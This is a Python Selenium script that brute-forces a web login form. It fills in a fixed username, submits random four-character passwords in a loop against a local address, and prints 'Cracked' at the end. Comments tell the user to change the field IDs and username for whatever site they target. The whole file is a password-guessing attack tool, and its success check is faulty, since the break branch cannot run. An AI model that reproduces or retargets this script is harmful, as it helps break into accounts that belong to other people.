import time
from random import *
from selenium import webdriver 
from selenium.webdriver.chrome.service import Service 
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait

service = Service (executable_path="chromedriver.exe")
driver= webdriver.Chrome(service= service)
driver.get("http://127.0.0.1:5000")
username = driver.find_element(By.ID,"username") #change the id by inspecting the site you are using
username.send_keys("user123") #change the user name according to you
password= driver.find_element(By.ID,"password")  #change the id by inspecting the site
f=0
while (f!=1):
    guess=""
    p= ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j','k', 
            'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't','u','v', 
            'w', 'x', 'y', 'z','1','2','3','4','5','6','7','8','9','0','!',
            '@','#','$','%','^','&','*','(',')','_','-','=','+',]

   # while(f!=1):
        #guess=""
    for letter in range(0,4):
        guess_letter = p[randint(0, 49)]
        guess = str(guess_letter) + str(guess)
    password.send_keys(guess)
    print(guess)
    driver.find_element(By.CLASS_NAME,"my_button").click()
    username = driver.find_element(By.ID,"username") #change the id by inspecting the site you are using
    username.send_keys("user123") #change the user name according to you
    password= driver.find_element(By.ID,"password")  #change the id by inspecting the site
    password.clear()
    driver.implicitly_wait(15)
    if driver.find_element(By.ID,"username"):
        continue
    else:
        break 
driver.implicitly_wait(13)
print("Cracked")
driver.quit()

        
